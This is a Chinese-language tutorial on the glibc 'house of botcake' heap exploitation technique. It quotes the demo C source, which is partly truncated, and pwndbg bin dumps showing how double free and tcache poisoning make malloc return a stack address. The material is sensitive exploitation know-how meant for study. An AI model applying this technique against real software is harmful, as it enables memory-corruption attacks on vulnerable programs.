house of botcake运用了chunk overlapping的方法,将我们的chunk同时放在了unsorted
bin和tcache中,与我们的fastbin_dup_consolidate很相似但不太一样
下面我们就来看看这个新增的攻击技巧吧,由于本例的特殊性,我会在ubuntu 19.04的docker上进行调试
首先我们进入源代码
###  源代码
    #include 
    #include 
    #include 
    #include 
    int main()
    {
      //本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了
        /*
         * This attack should bypass the restriction introduced in
         * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
         * If the libc does not include the restriction, you can simply double free the victim and do a
         * simple tcache poisoning
         */
        //关闭缓冲区并使得_FILE_IO不会影响到我们的堆
        // disable buffering and make _FILE_IO does not interfere with our heap
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        // introduction
        //本demo是一个强力的攻击手段,通过tcache posioning attack来欺骗malloc返回一个指向任意地址的指针
        puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
        puts("returning a pointer to an arbitrary location (in this demo, the stack).");
        //本攻击仅依赖于double free
        puts("This attack only relies on double free.n");
        // prepare the target
        //攻击目标
        intptr_t stack_var[4];
        puts("The address we want malloc() to return, namely,");
        printf("the target address is %p.nn", stack_var);
        // prepare heap layout
        //布置一下栈
        puts("Preparing heap layout");
        //首先申请7个大小为0x100的chunks来为后面填满tcache做准备
        puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
        intptr_t *x[7];
        for(int i=0; i p/x x                                                                                                                                                                                                   
    $2 = {0x555555559260, 0x555555559370, 0x555555559480, 0x555555559590, 0x5555555596a0, 0x5555555597b0, 0x5555555598c0}
然后是我们的chunk prev,a 还有用来防止合并的chunk
    0x5555555599c0 PREV_INUSE {
      mchunk_prev_size = 0,
      mchunk_size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x555555559ad0 PREV_INUSE {
      mchunk_prev_size = 0,
      mchunk_size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x555555559be0 FASTBIN {
      mchunk_prev_size = 0,
      mchunk_size = 33,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20401
    }
到这里结束,就是我们对堆做的一个简答的构造布局了,下面开始我们的overlapping的构造
首先来填满我们的tcache-list
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0                                                                  
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
因为我们0x110的tcache-list被填满了,因此这里我们再free a就会进入unsorted bin了
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin